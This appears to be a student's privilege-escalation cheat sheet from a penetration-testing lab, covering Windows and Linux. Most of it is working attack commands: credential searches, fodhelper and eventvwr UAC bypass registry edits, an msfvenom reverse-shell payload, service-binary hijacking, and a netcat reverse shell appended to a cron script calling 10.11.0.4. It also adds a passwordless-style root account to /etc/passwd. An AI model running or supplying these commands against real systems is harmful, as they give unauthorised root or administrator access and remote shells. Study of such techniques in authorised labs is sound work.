### Windows
```
whoami
net user student
net user
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
findstr /si password *.xml *.ini *.txt 
tasklist /SVC
ipconfig /all
route -print
netstat -ano
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
schtasks /query /fo LIST /v
wmic product get name, version, vendor
wmic service get name,startname
wmic qfe get Caption, Description, HotFixID, InstalledOn
accesschk.exe -uws "Everyone" "C:\Program Files"
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
mountvol

powershell -> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path

Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}

reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
REG QUERY HKCU\Software\Policies\Microsoft\Windows\Installer

reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
REG QUERY HKLM\Software\Policies\Microsoft\Windows\Installer

windows-privesc-check2.exe --dump -G

```
https://www.fuzzysecurity.com/tutorials/16.html



### Linux
```
whoami
id
cat /etc/passwd
hostname
cat /etc/issue
cat /etc/*-release
uname -a
uname -r
arch
ps aux
ip a
/sbin/route
ss -anp
iptables
iptables-save
iptables-restore
grep -Hs iptables /etc/* - as regular user
ls -lah /etc/cron*
cat /etc/crontab
grep "CRON" /var/log/cron.log
dpkg -l
mount
cat /etc/fstab
/bin/lsblk
lsmod
/sbin/modinfo libata
find / -writable -type d 2>/dev/null

find / -perm -u=s -type f 2>/dev/null

./unix-privesc-check standard > output.txt

echo >> user_backups.sh 
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh

```



```
whoami /priv
whoami /groups - check privilege level for uac

net user admin Ev!lpass
powershell.exe Start-Process cmd.exe -Verb runAs - will require accepting UAC prompt



```


```
cd C:\Tools\privilege_escalation\SysinternalsSuite 
sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe

```
run fodhelper.exe
in process monitor - search fodhelper.exe
reg -> name not found -> HKCU 

HKCU:\Software\Classes\ms-settings\shell\open\command
HKCR:ms-settings\shell\open\command


REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f


UAC Bypass

```
whoami /priv

whoami /groups


C:\users\alice\desktop\sigcheck64.exe -accepteula -a -m .\eventvwr.exe

Did this to get high integrity shell and bypass

msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.119.175 LPORT=443 -f exe > shell_443.exe

reg add HKCU\Software\Classes\mscfile\shell\open\command /d C:\users\alice\desktop\shell_443.exe /f

C:\Windows\system32\eventvwr.exe
```


Listing running services on Windows using PowerShell

```
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}

icacls "C:\Program Files\Serviio\bin\ServiioService.exe"

i686-w64-mingw32-gcc adduser.c -o adduser.exe

move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"

move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"

dir "C:\Program Files\Serviio\bin\"

wmic service where caption="Serviio" get name, caption, state, startmode

whoami /priv

shutdown /r /t 0

net localgroup administrators

#### unquoted service paths

```
wmic service get displayname,pathname

place adduser.exe in 

C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe

we could name our executable Program.exe and place it in C:\, or name it My.exe and place it in C:\Program Files. However, this would require some unlikely write permissions since standard users do not have write access to these directories by default.
It is more likely that the software’s main directory (C:\Program Files\My Program in our example) or subdirectory (C:\Program Files\My Program\My service) is misconfigured, allowing us to plant a malicious My.exe binary.

```

### USBPcap

```

systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

driverquery /v

C:\Program Files\USBPcap> type USBPcap.inf

mingw-w64.bat

C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1> mingw-w64.bat
C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1>echo off Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.
C:\> gcc
gcc: fatal error: no input files compilation terminated.
C:\> gcc --help
Usage: gcc [options] file...

gcc

gcc --help

```
# Cron

```
grep "CRON" /var/log/cron.log

student@debian:/var/scripts$ echo >> user_backups.sh 
student@debian:/var/scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh 
student@debian:/var/scripts$ cat user_backups.sh
#!/bin/bash
cp -rf /home/student/ /var/backups/student/
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f


```

# Updating /etc/passwd file

```
openssl passwd evil 

echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd 

su root2
```




